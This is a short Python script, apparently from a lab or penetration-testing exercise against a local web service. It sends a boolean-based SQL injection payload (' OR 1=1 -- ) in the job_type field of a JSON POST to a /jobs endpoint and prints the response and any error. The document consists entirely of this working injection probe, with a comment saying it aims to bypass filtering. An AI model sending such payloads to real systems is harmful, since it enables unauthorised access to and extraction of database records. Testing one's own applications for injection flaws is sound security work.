import json, urllib.request
url = 'http://localhost:80/jobs'
headers = {'Content-Type': 'application/json'}
# Boolean-based SQL injection payload aiming to bypass filtering
payload = {"job_type": "' OR 1=1 -- "}
req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=headers, method='POST')
try:
    with urllib.request.urlopen(req) as resp:
        print(resp.status)
        body = resp.read().decode()
        print(body)
except Exception as e:
    # Print error code and response, if available
    if hasattr(e, 'code'):
        print('ERR', e.code)
        print(e.read().decode())
    else:
        print('EXC', e)

